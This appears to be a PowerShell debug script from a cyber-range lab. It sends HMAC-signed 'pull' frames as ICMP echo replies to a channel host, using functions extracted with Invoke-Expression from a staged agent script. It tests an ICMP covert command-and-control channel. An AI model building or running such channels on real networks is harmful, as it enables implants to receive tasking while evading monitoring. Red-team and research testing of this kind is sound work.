# guest-icmp-send.ps1 — fires ONE governed pull frame (type 0) at the channel host from
# inside the range guest, using the EXACT functions from the staged varvel-agent.ps1
# (AST-extracted, zero duplication). This isolates the wire: if this frame lands but the
# agent's own pulls don't, the bug is in the agent runtime; if this doesn't land either,
# the guest→host type-0 path itself is broken.
param(
  [string]$AgentFile = 'C:\Windows\System32\agentbox\varvel-agent.ps1',
  [string]$AgentId = 'probe000000',
  [string]$Token = '00',
  [string]$Dst = '192.168.50.1',
  [string]$Marker = ''
)
$ErrorActionPreference = 'Stop'
$tokens = $null; $errors = $null
$ast = [System.Management.Automation.Language.Parser]::ParseFile($AgentFile, [ref]$tokens, [ref]$errors)
if ($errors.Count) { Write-Host 'AGENTFILE-PARSE-FAIL'; exit 1 }
$want = @('Get-InetChecksum', 'Get-IcmpPacket', 'Connect-Icmp', 'Get-HmacHex', 'Get-EncodedQuery', 'ConvertTo-B32')
$fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
$found = @()
foreach ($f in $fns) { if ($want -contains $f.Name) { Invoke-Expression $f.Extent.Text; $found += $f.Name } }
foreach ($w in $want) { if (-not ($found -contains $w)) { Write-Host "MISSING-FN: $w"; exit 1 } }
$B32_CHARS = '0123456789abcdefghijklmnopqrstuv'   # agent script-level constant (line 124)
$script:Seq = 0
$Url = "icmp://$Dst"
try { Connect-Icmp } catch { Write-Host ('SOCK-FAIL: ' + $_.Exception.Message); exit 1 }
if ($Marker) {
  $payload = [Text.Encoding]::UTF8.GetBytes($Marker)
} else {
  $script:Seq = 1
  $h = Get-HmacHex $Token ($AgentId + ':1:pull')
  $payload = [Text.Encoding]::UTF8.GetBytes((Get-EncodedQuery ([ordered]@{ a = $AgentId; s = 1; h = $h }) 'ax.sim'))
}
$pkt = Get-IcmpPacket 0 1 1 0 1 $payload
$sent = 0
foreach ($i in 1..3) {
  try { [void]$script:IcmpSock.SendTo($pkt, $script:IcmpEndPoint); $sent++ } catch { Write-Host ('SEND-FAIL: ' + $_.Exception.Message) }
  Start-Sleep -Milliseconds 300
}
Write-Host ("SENT $sent/3 type-0 frames to $Dst (payload " + $payload.Length + " bytes)")
